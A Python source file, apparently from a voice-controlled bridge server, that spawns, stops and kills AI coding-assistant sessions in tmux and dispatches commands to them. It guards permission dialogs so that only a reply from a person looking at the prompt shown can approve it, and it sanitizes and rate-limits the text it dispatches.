    The TUI select widget binds Tab/Arrow + Enter (per its own footer
    advertisement); number keys may or may not jump-and-select. We use
    arrows for definitive correctness.

    ``focused_index`` on ``live`` is the latest cursor position the
    activity poller observed. The bridge updates this on every tick
    that detects the prompt (not just signature-change edges) so the
    delta math is current even if the cursor moved without changing
    the option set.

    When ``focused_index`` is unknown (no cursor was visible in the
    last capture — could be a transient render), default to 0 so we
    still send a deterministic sequence rather than no-op.
    """
    focused = live.focused_index if live.focused_index is not None else 0
    focused = max(0, min(focused, len(live.options) - 1))
    delta = choice_index - focused

    nav_keys: list[str] = []
    if delta > 0:
        nav_keys.extend(["Down"] * delta)
    elif delta < 0:
        nav_keys.extend(["Up"] * abs(delta))
    nav_keys.append("Enter")

    # tmux interprets each positional argument as a key name when -l
    # is absent. "Down", "Up", "Enter" are documented tmux key names
    # and emit the matching ANSI escape (or \r for Enter) to the pane.
    try:
        proc = await asyncio.create_subprocess_exec(
            "tmux", "send-keys", "-t", tmux_target, "--", *nav_keys,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        await proc.wait()
        log_event("info", project,
                  f"Committed TUI choice {choice_index + 1} "
                  f"(delta {delta} from focused {focused}): {' '.join(nav_keys)}")
    except Exception as exc:
        log_event("error", project, f"Failed to commit TUI choice: {exc}")


# ---------------------------------------------------------------------------
# Session spawning
# ---------------------------------------------------------------------------


async def _handle_spawn_session(data: dict, ws: WebSocket) -> None:
    """Spawn a new assistant session in a tmux window."""
    project_name = data.get("project", "")
    # Typed into the new pane with `send-keys -l`; see the note on note_text.
    prompt = _sanitize_dispatch_text(data.get("prompt", ""))
    raw_assistant = data.get("assistant")
    # Optional cockpit overrides (Grok family): model id + reasoning effort.
    raw_model = data.get("model")
    raw_effort = data.get("reasoning_effort")
    if raw_effort is None:
        raw_effort = data.get("effort")  # cockpit alias
    model_override = raw_model.strip() if isinstance(raw_model, str) else None
    effort_override = raw_effort.strip() if isinstance(raw_effort, str) else None

    if raw_assistant is not None and not isinstance(raw_assistant, str):
        try:
            await send_signed(
                ws,
                {"type": "error", "message": "field 'assistant' must be a string"},
            )
        except Exception:
            pass
        return
    if raw_assistant and not is_supported_assistant(raw_assistant):
        try:
            await send_signed(
                ws,
                {"type": "error", "message": f"unsupported assistant '{raw_assistant}'"},
            )
        except Exception:
            pass
        return
    assistant = normalize_assistant(raw_assistant, default=default_assistant())

    if not project_name:
        try:
            await send_signed(ws,{"type": "error", "message": "project is required"})
        except Exception:
            pass
        return

    # Look up project directory from config or use explicit dir from client
    project_dir = data.get("dir", "")
    if not project_dir:
        projects = _load_projects()
        for p in projects:
            if p["name"].lower() == project_name.lower():
                project_dir = p["dir"]
                project_name = p["name"]  # normalize casing
                break

    if not project_dir:
        try:
            await send_signed(ws,{
                "type": "error",
                "message": f"Project '{project_name}' not found in projects.json",
            })
        except Exception:
            pass
        return

    project_dir, dir_err = _validate_project_dir(project_dir)
    if dir_err:
        try:
            await send_signed(ws,{
                "type": "error",
                "message": f"Invalid project directory: {dir_err}",
            })
        except Exception:
            pass
        return

    # Generate unique tmux session name.
    # Strip chars that tmux doesn't allow in session names (spaces, dots, colons).
    safe_name = re.sub(r"[^a-zA-Z0-9\-_]", "-", project_name)
    hex_suffix = secrets.token_hex(2)
    tmux_session = f"vh-{safe_name}-{hex_suffix}"

    try:
        # Spawn tmux session running the selected assistant.
        # Pane env (VOXHERD_HOOK_ASSISTANT, CLAUDE_CODE_TASK_LIST_ID) is injected
        # via tmux -e + `env` prefix — the tmux *client* env is NOT inherited by
        # the pane (setting env=… alone does not reach SessionStart hooks).
        # model / reasoning_effort flow through for Grok family only.
        tmux_argv = build_tmux_spawn_argv(
            tmux_session,
            project_dir,
            assistant,
            model=model_override,
            reasoning_effort=effort_override,
        )
        env = apply_assistant_env(get_subprocess_env(), assistant)

        proc = await asyncio.create_subprocess_exec(
            *tmux_argv,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
            env=env,
        )
        _, stderr = await asyncio.wait_for(proc.communicate(), timeout=5.0)

        if proc.returncode != 0:
            err = stderr.decode().strip() if stderr else "unknown error"
            log_event(
                "error",
                project_name,
                f"Failed to spawn {assistant} tmux session: {err}",
            )
            try:
                # Don't leak raw stderr to client — use generic message
                await send_signed(ws,{
                    "type": "error",
                    "message": "Failed to spawn session (check bridge logs)",
                })
            except Exception:
                pass
            return

        log_event("success", project_name, f"Spawned {assistant} tmux session: {tmux_session}")

        try:
            await send_signed(ws,{
                "type": "spawn_accepted",
                "project": project_name,
                "tmux_session": tmux_session,
                "assistant": assistant,
            })
        except Exception:
            pass

        # Codex does not currently expose lifecycle hooks. Register a synthetic
        # session so dispatch/state still works from tmux-driven activity.
        if not supports_hooks(assistant):
            synthetic_session_id = f"{assistant}-{tmux_session}"
            session, removed_ids = sessions.register_session(
                synthetic_session_id,
                project_name,
                project_dir,
                tmux_target=f"{tmux_session}:0.0",
                assistant=assistant,
            )
            if session is None:
                await _form_error(
                    ws, synthetic_session_id,
                    "Could not register the spawned session: its directory was refused.",
                )
                return
            sessions.set_active_project(project_name)
            reg_msg = {
                "type": "session_registered",
                "replaces": removed_ids,
                "set_active_project": project_name,
            }
            reg_msg.update(session.to_dict())
            reg_msg["agent_number"] = session.agent_number
            await broadcast_to_ios(reg_msg)
            log_event("success", project_name, f"Auto-registered {assistant} session")

        # If a prompt was provided, wait for startup and send it.
        if prompt:
            asyncio.create_task(_send_prompt_after_delay(tmux_session, project_name, prompt))

    except asyncio.TimeoutError:
        log_event("error", project_name, "Timed out spawning tmux session")
        try:
            await send_signed(ws,{"type": "error", "message": "Timed out spawning session"})
        except Exception:
            pass
    except Exception as exc:
        log_event("error", project_name, f"Failed to spawn session: {exc}")
        try:
            await send_signed(ws,{"type": "error", "message": "Internal error spawning session"})
        except Exception:
            pass


async def _send_prompt_after_delay(tmux_session: str, project: str, prompt: str) -> None:
    """Wait for the assistant to initialize, then send the prompt via tmux."""
    await asyncio.sleep(3.0)
    try:
        p1 = await asyncio.create_subprocess_exec(
            "tmux", "send-keys", "-t", tmux_session, "-l", "--", prompt,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        await p1.wait()
        p2 = await asyncio.create_subprocess_exec(
            "tmux", "send-keys", "-t", tmux_session, "--", "Enter",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        await p2.wait()
        log_event("info", project, f"Sent initial prompt to {tmux_session}")
    except Exception as exc:
        log_event("error", project, f"Failed to send prompt: {exc}")


# ---------------------------------------------------------------------------
# Session stop / kill
# ---------------------------------------------------------------------------


async def _handle_stop_session(data: dict, ws: WebSocket) -> None:
    """Send Ctrl-C to a tmux session (graceful stop)."""
    tmux_session = data.get("tmux_session", "")
    if not tmux_session:
        return

    if not _is_safe_tmux_target(tmux_session):
        try:
            await send_signed(ws,{"type": "error", "message": "Cannot stop this session"})
        except Exception:
            pass
        return

    try:
        proc = await asyncio.create_subprocess_exec(
            "tmux", "send-keys", "-t", tmux_session, "--", "C-c",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        await proc.wait()
        log_event("warning", tmux_session, "Session stopped (Ctrl-C)")
    except Exception as exc:
        log_event("error", tmux_session, f"Failed to stop: {exc}")
        return

    try:
        await send_signed(ws,{
            "type": "session_stopped",
            "tmux_session": tmux_session,
        })
    except Exception:
        pass

    await broadcast_to_ios(_state_sync_msg())


async def _handle_kill_session(data: dict, ws: WebSocket) -> None:
    """Kill a tmux session entirely."""
    tmux_session = data.get("tmux_session", "")
    if not tmux_session:
        return

    if not _is_safe_tmux_target(tmux_session):
        try:
            await send_signed(ws,{"type": "error", "message": "Cannot kill this session"})
        except Exception:
            pass
        return

    # Remove any registered sessions that reference this tmux session
    for sid, s in list(sessions.get_all_sessions().items()):
        if s.tmux_target and s.tmux_target.split(":")[0] == tmux_session:
            # ``remove_session`` forgets the per-session books. This site used
            # to pop only _STICKY_ACTIVITY, so a killed session's id stayed in
            # _LAST_CHOICE_FOR_SESSION -- and so in state_sync's
            # active_choice_sessions, which clients prune against, leaving a
            # decision card for a session that no longer exists.
            await _cancel_terminal_subs_for_session(sid, project=s.project)
            sessions.remove_session(sid)

    try:
        proc = await asyncio.create_subprocess_exec(
            "tmux", "kill-session", "-t", tmux_session,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        await proc.wait()
        log_event("warning", tmux_session, "Session killed")
    except Exception as exc:
        log_event("error", tmux_session, f"Failed to kill: {exc}")
        return

    try:
        await send_signed(ws,{
            "type": "session_killed",
            "tmux_session": tmux_session,
        })
    except Exception:
        pass

    await broadcast_to_ios(_state_sync_msg())


# ---------------------------------------------------------------------------
# Verbosity control
# ---------------------------------------------------------------------------


async def _handle_set_client_setting(ws, data: dict) -> None:
    """Set a display setting and push it to every client.

    The setting belongs to the bridge, not to the device that asked: a voice
    command is heard by a phone but is *about* the glasses, which are a
    different device. Holding it here is also what lets a client that was
    disconnected converge -- ``state_sync`` carries the current values, so a
    returning client does not come back on the wrong theme and stay there.

    An unknown name or value is rejected with an error rather than ignored.
    These values are broadcast verbatim to every client; silently accepting an
    arbitrary one would put an arbitrary string on four devices.
    """
    import bridge.server_state as _state

    name = data.get("setting")
    value = data.get("value")
    if not isinstance(name, str) or not isinstance(value, str) or not _state.set_client_setting(name, value):
        try:
            await send_signed(ws, {
                "type": "error",
                "message": f"Unknown client setting {name!r}={value!r}",
            })
        except Exception:
            pass
        return

    await _state.broadcast_to_ios({
        "type": "client_setting",
        "setting": name,
        "value": value,
    })
    log_event("info", "bridge", f"Client setting {name} → {value}")


async def _handle_speech_floor(ws, data: dict) -> None:
    """A headset takes, renews or releases the speech floor.

    While it holds the floor, narration is the headset's alone: the Mac and the
    phones stay quiet. Every client learns of a change through ``state_sync``;
    a renewal changes nothing, so it says nothing. ``claim`` must be a JSON
    boolean -- a stray string must not silence two devices.
    """
    claim = data.get("claim")
    if not isinstance(claim, bool):
        try:
            await send_signed(ws, {"type": "error", "message": "speech_floor needs claim: true or false"})
        except Exception:
            pass
        return
    if _state.claim_speech_floor(claim, holder=ws):
        log_event("info", "bridge", "Speech floor " + ("taken by a headset" if claim else "released"))
        await broadcast_to_ios(_state._state_sync_msg())


async def _handle_set_verbosity(data: dict) -> None:
    """Set the narration engine's verbosity level."""
    import bridge.server_state as _state
    level = data.get("level", "normal")
    if _state.narration:
        from bridge.narration import Verbosity
        try:
            _state.narration.set_verbosity(Verbosity(level))
            log_event("info", "bridge", f"Verbosity → {level}")
        except ValueError:
            pass


# ---------------------------------------------------------------------------
# Command dispatch
# ---------------------------------------------------------------------------


async def _check_session_actually_idle(session) -> bool:
    """Quick tmux check: is the assistant actually at its idle prompt?

    When the session status is "active" but we suspect it may be stale
    (e.g. stop hook delayed, activity poll hasn't caught up), capture the
    terminal and look for the idle prompt with no spinners.  Returns True
    if the session appears idle at its prompt, False if it looks genuinely busy.
    """
    from bridge.activity import _has_idle_prompt, _detect_activity_type
    target = session.tmux_target
    if not target:
        return False
    target, err = _validate_tmux_pane_target(target)
    if err or not target:
        return False
    try:
        proc = await asyncio.create_subprocess_exec(
            "tmux", "capture-pane", "-t", target,
            "-p", "-S", "-30",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
            env=get_subprocess_env(),
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=2.0)
        raw = stdout.decode("utf-8", errors="replace")
        # Strip ANSI escape sequences
        from bridge.validation import _ANSI_RE
        clean = _ANSI_RE.sub("", raw) if raw else ""
        if not clean.strip():
            return False
        # Check for idle prompt and no active spinners/tool patterns
        detected = _detect_activity_type(clean)
        if detected is None and _has_idle_prompt(clean):
            return True
        return False
    except (asyncio.TimeoutError, Exception):
        return False


def _check_dispatch_rate(session_id: str) -> bool:
    """Return True if the dispatch is within rate limits."""
    now = time.time()
    timestamps = _dispatch_timestamps.get(session_id, [])
    # Prune old timestamps
    timestamps = [t for t in timestamps if now - t < _DISPATCH_RATE_WINDOW]
    if len(timestamps) >= _DISPATCH_RATE_LIMIT:
        _dispatch_timestamps[session_id] = timestamps
        return False
    timestamps.append(now)
    _dispatch_timestamps[session_id] = timestamps
    return True


async def handle_voice_command(data: dict, websocket: WebSocket) -> None:
    """Resolve the target session and dispatch a command to that assistant."""
    target_project = data.get("project", "")
    message = _sanitize_message(data.get("message", ""))
    if not message:
        await send_signed(websocket,{"type": "error", "message": "Empty command"})
        return
    session_id = data.get("session_id")
    agent_number = data.get("agent_number")
    raw_assistant = data.get("assistant")

    if raw_assistant is not None and not isinstance(raw_assistant, str):
        await send_signed(
            websocket,
            {"type": "error", "message": "field 'assistant' must be a string"},
        )
        return
    if raw_assistant and not is_supported_assistant(raw_assistant):
        await send_signed(
            websocket,
            {"type": "error", "message": f"unsupported assistant '{raw_assistant}'"},
        )
        return
    assistant = normalize_assistant(raw_assistant, default="claude") if raw_assistant else None

    # Resolve session: session_id > project+agent_number(+assistant) > project(+assistant)
    if session_id:
        session = sessions.get_session(session_id)
    elif agent_number is not None and target_project:
        try:
            parsed_agent_number = int(agent_number)
        except (TypeError, ValueError):
            await send_signed(
                websocket,
                {"type": "error", "message": "field 'agent_number' must be an integer"},
            )
            return
        session = sessions.get_session_by_project_and_number(
            target_project,
            parsed_agent_number,
            assistant=assistant,
        )
    else:
        session = sessions.get_session_by_project(target_project, assistant=assistant)

    if session is None:
        assistant_suffix = f" (assistant={assistant})" if assistant else ""
        await send_signed(websocket,{
            "type": "error",
            "message": f"No session found for project '{target_project}'{assistant_suffix}",
        })
        log_event(
            "error",
            target_project,
            f"No session found for command dispatch{assistant_suffix}",
        )
        return

    # What the wearer pointed at in the Reader, expanded into this
    # assistant's own idiom. Before the queue, so a
    # busy session queues the words it will actually receive; and refused
    # whole, not sent bare -- "what does this do?" without the "this" would
    # be a question about nothing.
    if data.get("reference") is not None:
        try:
            message = _sanitize_message(reader.expand_reference(
                message, data["reference"], normalize_assistant(session.assistant),
                reader.project_root(session.project_dir or ""),
            ))
        except reader.ReaderError as exc:
            await send_signed(websocket, {
                "type": "error",
                "session_id": session.session_id,
                "message": f"Couldn't send what you pointed at: {exc.message}",
            })
            log_event("error", target_project, f"Reference refused: {exc.message}")
            return

    # Rate limit check
    if not _check_dispatch_rate(session.session_id):
        await send_signed(websocket,{
            "type": "error",
            "message": f"Rate limit exceeded for '{target_project}' — try again shortly",
        })
        log_event("warning", target_project, "Command dispatch rate-limited")
        return

    # A decision on screen is answered (or refused) now, before the queue.
    # Status alone cannot be trusted to say "blocked": it becomes "waiting"
    # only when a notification hook fires, so a session without one -- Codex,
    # a discovered pane -- reads "active" while its permission dialog sits
    # there. Queued, an approval would wait for an idle that never comes and
    # then be typed into the prompt as text once the dialog was gone.
    if session.tmux_target:
        live_target, live_err = _validate_tmux_pane_target(session.tmux_target)
        if not live_err and live_target and await _intercept_for_live_decision(
            # A client sent this in response to the card it is showing, so it is
            # allowed to be the answer — subject to the shown-prompt check.
            session, live_target, message, may_answer=True,
        ):
            return

    # If session is busy, queue the command instead of rejecting.
    # Sending tmux send-keys while an assistant is working garbles the terminal,
    # so we hold the command and dispatch it when the session goes idle
    # (detected by the activity poll loop in activity.py).
    #
    # However, sessions can get stuck in "active" when the stop hook is
    # delayed and the activity poll hasn't auto-idled them yet.  Before
    # queueing, do a quick tmux check: if the assistant is actually sitting
    # at its idle prompt (no spinners, idle prompt visible), force the
    # session to idle and dispatch immediately.
    if session.status == "active":
        actually_idle = False
        if session.tmux_target:
            actually_idle = await _check_session_actually_idle(session)
        if actually_idle:
            sessions.update_status(session.session_id, "idle", activity_type="sleeping")
            log_event("info", target_project,
                      f"Session appeared active but is idle at prompt — dispatching immediately")
        else:
            session.queued_command = message
            # Single broadcast — `broadcast_to_ios` already iterates every
            # connected iOS socket including the originating one. The
            # previous code also called `send_signed(websocket, ...)`
            # which delivered the same event to the requesting client a
            # second time, causing TTS to announce "Queued for X, will
            # send when it's free" twice. `command_accepted` below uses
            # the same single-broadcast pattern.
            await broadcast_to_ios({
                "type": "command_queued",
                "session_id": session.session_id,
                "project": session.project,
                "assistant": session.assistant,
                "message": message,
            })
            log_event("warning", target_project, f"Command queued (session busy): {message[:60]}")
            return

    # Mark active immediately before spawning.  If update_status returns
    # None the session was pruned between our lookup and now — abort early
    # so we don't broadcast command_accepted for a dead session.
    if sessions.update_status(session.session_id, "active", activity_type="working") is None:
        await send_signed(websocket,{
            "type": "error",
            "session_id": session.session_id,
            "message": f"Session for '{target_project}' expired before command could be dispatched",
        })
        log_event("error", target_project, "Session expired between lookup and dispatch")
        return

    # Capture values from the session *before* any await that could yield
    # to the event loop (where the prune loop might remove the session).
    sid = session.session_id
    project = session.project
    project_dir = session.project_dir

    # Fire and forget -- the Stop hook will notify us when done.
    # _dispatch_agent re-validates the session before executing in case
    # it gets pruned between now and when the task runs.
    asyncio.create_task(_dispatch_agent(sid, project_dir, message))

    await broadcast_to_ios({
        "type": "command_accepted",
        "session_id": sid,
        "project": project,
        "assistant": session.assistant,
        "message": message,
        "activity_type": "working",
        # The user spoke this command — iOS announces "Sending to <project>".
        # Automation dispatches (REST) are tagged "api" and stay silent; see
        # routes.rest_command. A swarm feeding N workers through the REST
        # API used to make the phone chant "Sending to X" N times over.
        "origin": "voice",
    })
    log_event("warning", project, f"Command dispatched: {message}")


async def _handle_dead_pane(
    session_id: str, tmux_target: str, stderr: bytes | None
) -> None:
    """React to a dispatch whose tmux pane turned out to be gone.

    ``tmux send-keys`` to a missing pane exits non-zero instead of raising,
    so the dispatcher has to handle it explicitly. iOS already heard
    "Sending to <project>" (``command_accepted`` is broadcast before this
    task runs), and no Stop hook will fire because nothing ran — so without
    this the session stays wedged "active" and every retry just re-announces
    the send. Here we: log the real tmux error, drop the stale registration
    so routing falls through to a live sibling (or cleanly reports "no
    session"), tell iOS the command wasn't delivered, and push a fresh
    state_sync so the dashboard/lens clear the stale card immediately. A
    still-live session re-registers on its next SessionStart hook.
    """
    session = sessions.get_session(session_id)
    project = session.project if session else "the session"
    detail = (stderr or b"").decode("utf-8", "replace").strip()
    log_event(
        "error",
        project,
        f"tmux pane gone ({tmux_target}) — dropping stale session: "
        f"{detail or 'no such pane'}",
    )
    sessions.remove_session(session_id)
    await broadcast_to_ios({
        "type": "error",
        "session_id": session_id,
        "message": f"{project}'s terminal has ended — the command wasn't delivered.",
    })
    # Immediate state refresh so iOS prunes the wedged "active" card instead
    # of waiting for the next activity-poll tick.
    await broadcast_to_ios(_state_sync_msg())


async def _decision_on_screen(tmux_target: str) -> tuple:
    """Capture the pane now and return ``(form, choice)`` if one is showing.

    At most one is non-None; a form wins, as it does in the activity poll.
    Deliberately a fresh capture rather than the poll's cache, which lags
    by up to a poll interval: a widget that appeared a moment ago is
    exactly the one a dispatch would otherwise type into.
    """
    lines = await _capture_clean_lines(tmux_target)
    if not lines:
        return None, None
    from bridge.choice_detector import detect_choice_prompt, detect_question_form

    form = detect_question_form(lines)
    if form is not None:
        return form, None
    return None, detect_choice_prompt(lines)


async def _intercept_for_live_decision(
    session, tmux_target: str, message: str, *, may_answer: bool = False
) -> bool:
    """Keep typed text out of a select widget; turn approve/deny into a pick.

    Returns True when the message was dealt with here and must NOT be typed.

    ``may_answer`` is what separates a decision from a coincidence. Only a
    message composed by a human who is looking at this prompt right now may
    become an answer; everything else is refused and re-announced. Without it,
    the word "yes" approved a permission dialog no matter where it came from:

    - a queued message, composed minutes earlier about something else, answered
      whatever dialog happened to be on screen when the queue drained;
    - a REST dispatch from a script or a swarm worker did the same;
    - and on the Mac the mic is opened by the announcement itself, with no wake
      word, so any two-word utterance in the room ("go ahead", "do it") became a
      ``tell`` aimed at the last-announced project and then an approval.

    Even when ``may_answer`` is true the prompt must be the one the user was
    actually shown -- see ``_commit_matches_shown``. The announcement names the
    tool, so approving a dialog that replaced it would approve something the
    speaker never heard.

    Typing into a select widget does not do what the sender meant. The text
    is ignored and the Enter after it confirms the highlighted option, which
    on Claude Code's permission dialog is "Yes". Measured on 2.1.282: the
    iOS card's ``/deny`` approved the command it was denying, and so would
    any other message sent to a session blocked on permission.

    - A plain approval or denial of a permission dialog commits that option
      through the same arrow-key path a card commit uses.
    - Anything else is refused, not typed, and the session goes back to
      ``waiting``: the sender learns the agent is blocked on a question,
      which is true, rather than hearing that their message was sent.

    Legacy ``number``-mode prompts are left alone: those are an ordinary
    input line under a numbered list, and typing is how they are answered.
    """
    form, choice = await _decision_on_screen(tmux_target)
    if form is None and (choice is None or choice.input_mode != "tui_select"):
        return False

    from bridge.choice_detector import permission_reply_index

    project = session.project
    if choice is not None and may_answer:
        idx = permission_reply_index(choice, message)
        if idx is not None and not _commit_matches_shown(session.session_id, choice):
            log_event(
                "warning", project,
                "Spoken reply ignored: the prompt on screen is not the one announced",
            )
            idx = None
        if idx is not None:
            await _send_tui_choice(tmux_target, choice, idx, project)
            log_event(
                "info", project,
                f"Permission {'approved' if idx == 0 else 'denied'} by reply "
                f"{message[:40]!r} → option {idx + 1}",
            )
            return True

    what = (
        "a permission prompt" if choice is not None and choice.kind == "permission"
        else "a question on screen"
    )
    log_event("warning", project, f"Not typed — {what} is open: {message[:60]}")
    sessions.update_status(session.session_id, "waiting", activity_type="approval")
    await broadcast_to_ios({
        "type": "error",
        "session_id": session.session_id,
        "message": f"{project} is waiting on {what} — answer it first. Nothing was sent.",
    })
    await broadcast_to_ios(_state_sync_msg())
    return True


async def _dispatch_agent(
    session_id: str,
    project_dir: str,
    message: str,
    *,
    may_answer_decision: bool = False,
) -> None:
    """Send a command to a session's configured assistant.

    If the session has a ``tmux_target``, types the message directly into
    the interactive terminal via ``tmux send-keys``. Otherwise falls back
    to assistant-specific resume commands when available.

    Sanitizing here rather than in each caller is deliberate: this is the one
    place every dispatch passes through -- the WebSocket, ``POST /api/command``,
    the queue drain and the Mac voice loop -- and the REST path had no
    sanitizer of its own, so raw ESC and CR reached the pane's tty.
    """
    message = _sanitize_dispatch_text(message)
    if not message:
        # Every caller has already marked the session active and announced
        # "Sending to X" by now, so returning quietly here left the phone and
        # the lens showing work that was never typed, with no Stop hook ever
        # coming to clear it -- the "stuck saying Sending to <project>" shape.
        # Put the session back and say so instead.
        log_event("warning", "bridge", "Dispatch dropped: message was empty after sanitizing")
        sessions.update_status(session_id, "idle", activity_type="sleeping")
        await broadcast_to_ios({
            "type": "error",
            "session_id": session_id,
            "message": "Nothing to send — the message was empty.",
        })
        await broadcast_to_ios(_state_sync_msg())
        return
    may_answer_decision = bool(may_answer_decision)
    session = sessions.get_session(session_id)

    # Guard: session may have been pruned between the time dispatch was
    # queued (create_task) and when this coroutine actually runs.  iOS
    # already received ``command_accepted``, so we must send an error to
    # let it know the command won't execute.
    if session is None:
        log_event("error", "bridge",
                  f"Session expired before dispatch: {session_id[:12]}...")
        await broadcast_to_ios({
            "type": "error",
            "session_id": session_id,
            "message": "Session expired before command could be dispatched",
        })
        return

    tmux_target = session.tmux_target
    assistant = normalize_assistant(session.assistant)
    if tmux_target:
        tmux_target, tmux_err = _validate_tmux_pane_target(tmux_target)
        if tmux_err or not tmux_target:
            log_event("error", "bridge", f"Invalid tmux target for session '{session_id}'")
            await broadcast_to_ios({
                "type": "error",
                "session_id": session_id,
                "message": "Invalid tmux target for dispatch",
            })
            return

    # A select widget on screen changes what typing means: the text is
    # ignored and the Enter after it picks whatever the cursor is on. On a
    # permission dialog that is "Yes" -- so this runs before anything is
    # typed, for every caller (voice, REST, the queue, the Mac voice loop).
    #
    # ``may_answer`` is passed through rather than defaulted: a decision that
    # appeared AFTER the caller composed its message is not that message's to
    # answer, so the queue drain and REST both arrive here as False and get the
    # refuse-and-re-announce path instead of an approval.
    if tmux_target and await _intercept_for_live_decision(
        session, tmux_target, message, may_answer=may_answer_decision
    ):
        return

    # Increment pending dispatch counter — each outstanding voice dispatch
    # suppresses listen on its corresponding stop event.  This handles
    # rapid-fire commands correctly (counter tracks all in-flight dispatches).
    if supports_hooks(assistant):
        session._pending_dispatch_count += 1

    if tmux_target:
        try:
            # Send the message text literally (-l prevents interpreting key names),
            # then send Enter as a separate command to submit it.
            # Must await each process to ensure ordering.
            #
            # CRITICAL: check each send-keys' return code. When the target
            # pane is gone — common for a swarm whose worker/conductor tmux
            # sessions come and go — `tmux send-keys` exits NON-ZERO
            # ("can't find pane: …") WITHOUT raising a Python exception. The
            # old code DEVNULL'd stderr and ignored the return code, so it
            # logged "Sent to tmux pane" as success and the command silently
            # vanished. Meanwhile iOS had already been told `command_accepted`
            # and announced "Sending to <project>", and the Stop hook never
            # fires (nothing ran) so the session stayed wedged "active" —
            # every retry just re-announced "Sending to <project>" with no
            # result. (This is the "stuck saying Sending to WeaveHacks4" bug.)
            # Mirror the dead-pane handling the terminal poll loop already does.
            p1 = await asyncio.create_subprocess_exec(
                "tmux", "send-keys", "-t", tmux_target, "-l", "--", message,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.PIPE,
                env=get_subprocess_env(),
            )
            _, err1 = await asyncio.wait_for(p1.communicate(), timeout=5.0)
            if p1.returncode != 0:
                await _handle_dead_pane(session_id, tmux_target, err1)
                return
            p2 = await asyncio.create_subprocess_exec(
                "tmux", "send-keys", "-t", tmux_target, "--", "Enter",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.PIPE,
                env=get_subprocess_env(),
            )
            _, err2 = await asyncio.wait_for(p2.communicate(), timeout=5.0)
            if p2.returncode != 0:
                await _handle_dead_pane(session_id, tmux_target, err2)
                return
            log_event("info", "bridge", f"Sent to tmux pane {tmux_target}")
        except Exception as exc:
            log_event("error", "bridge", f"Failed to send to tmux: {exc}")
    else:
        try:
            resume_cmd = resume_command_for_assistant(assistant, session_id, message)
            if resume_cmd is None:
                log_event(
                    "error",
                    "bridge",
                    f"Dispatch fallback unsupported for assistant '{assistant}' (no tmux target)",
                )
                await broadcast_to_ios({
                    "type": "error",
                    "session_id": session_id,
                    "message": f"Assistant '{assistant}' requires a live tmux session for dispatch",
                })
                return

            # Headless resume inherits this env (unlike tmux panes).
            env = apply_assistant_env(get_subprocess_env(), assistant)

            # Pipe stdout so we can tail the stream-json event log and
            # surface live progress (current tool, token counts) into
            # the lens footer. Without piping we lose all visibility
            # into what a dispatched `claude --resume -p` is doing.
            #
            # ``limit`` bumped from the asyncio default of 64 KiB because
            # Claude Code's stream-json emits ``Read`` results with the
            # entire file content in a single JSON line — a 200 KB file
            # would crash the reader with ``ValueError: Separator is not
            # found, and chunk exceed the limit`` at the FIRST read,
            # silently losing the rest of the run. 10 MiB is the same
            # ceiling Claude Code's own SDK uses.
            proc = await asyncio.wait_for(
                asyncio.create_subprocess_exec(
                    *resume_cmd,
                    cwd=project_dir,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                    env=env,
                    limit=10 * 1024 * 1024,
                ),
                timeout=10.0,
            )
            if proc.stdout is not None and assistant in ("claude", "codex"):
                # Lazily initialize the per-session ring buffer the
                # lens-footer extractor (session_status.py) reads from.
                if session._stream_json_buffer is None:
                    session._stream_json_buffer = deque(maxlen=50)
                # Hold a strong reference on the Session so the GC
                # doesn't reap the task mid-stream. ``remove_session``
                # is responsible for cancelling this task.
                reader_task = asyncio.create_task(
                    _consume_stream_json(proc, session_id)
                )
                session._stream_json_task = reader_task
        except asyncio.TimeoutError:
            log_event("error", "bridge", f"Timed out spawning {assistant} subprocess")
        except Exception as exc:
            log_event("error", "bridge", f"Failed to spawn {assistant}: {exc}")


async def _consume_stream_json(proc, session_id: str) -> None:
    """Read NDJSON events from a dispatched assistant subprocess and append
    them to the session's stream-json buffer.

    The buffer is read by ``session_status.extract_status_from_stream_json``
    on every activity poll tick (~1.5s), which lifts token counts and
    current-tool info onto the lens footer. We don't need to broadcast
    per-event ourselves — the existing poll loop's edge comparison
    naturally diffs and emits on change.

    Buffer is cleared lazily by the extractor itself (a trailing
    ``result`` event makes ``extract_status_from_stream_json`` return
    None, after which ``derive_status`` falls back to the activity_type
    enum). No explicit cleanup needed on EOF.
    """
    if proc.stdout is None:
        return
    try:
        while True:
            try:
                line = await proc.stdout.readline()
            except (asyncio.CancelledError, asyncio.IncompleteReadError):
                break
            except ValueError:
                # Line exceeded the StreamReader's `limit` (we bump it
                # to 10 MiB at spawn time, but a pathological tool
                # output could still trip it). Skip this line and
                # keep reading — the buffer self-recovers; alternative
                # would be silent exit, which loses ALL subsequent
                # events on this stream.
                continue
            if not line:
                break
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue
            session = sessions.get_session(session_id)
            if session is None or session._stream_json_buffer is None:
                continue
            session._stream_json_buffer.append(event)
    except Exception:
        # Defensive: a broken subprocess must never crash the bridge.
        # Log nothing — this runs frequently and would spam.
        pass
    finally:
        # Wait for the subprocess to fully exit so we don't leave zombies.
        try:
            await proc.wait()
        except Exception:
            pass
        # Drop our reference to the task on the session — the natural
        # EOF case ends up here too. ``remove_session`` will no-op on
        # already-cleared task references.
        session = sessions.get_session(session_id)
        if session is not None and getattr(session, "_stream_json_task", None) is not None:
            session._stream_json_task = None


# Backward-compat import path for existing tests/callers.
_dispatch_claude = _dispatch_agent
